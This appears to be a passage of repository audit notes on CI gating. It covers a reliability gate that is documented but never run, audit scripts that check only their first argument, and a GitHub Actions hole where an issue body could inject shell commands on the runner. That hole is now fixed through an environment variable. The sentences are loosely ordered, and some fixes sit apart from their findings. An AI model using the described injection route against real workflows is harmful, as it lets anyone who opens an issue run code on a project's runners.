The gating set is now the two defect indicators alone.

Objectives now declare `gating`: the four describing artifact fitness fail the build, while toil moves the loop phase without blocking a release. The threshold was not moved; the semantics were wrong, not the number.
- **A quality gate documented but never executed**: `CONTRIBUTING.md` listed "Reliability objectives" among the gates every pull request runs, while `ci.yml` had no such step — the convention-versus-enforcement gap of Observation 08, reappearing in the document that describes closing it, introduced by the commit that added the gate table row. Actions substitutes workflow expressions before the shell parses anything, so an issue body containing the heredoc terminator or a command substitution would execute on the runner — trivially reachable, since anyone can open an issue. The body is now written from the environment variable the step already declared.

Replaced with one invocation over `tools examples tests benchmarks`; `pr-sentinel.yml` now audits all changed files in a single consolidated run; `CONTRIBUTING.md` matches.

- **Sentinel and docs validator silently audited only the first supplied path**: `sentinel.py` read `argv[1]` alone and `docs_validator.py` declared `nargs="?"`, while `AGENTS.md` §8.2 instructs agents to run `sentinel.py <modified_files>` (plural) and `.pre-commit-config.yaml` invokes the sentinel with `pass_filenames: true`.
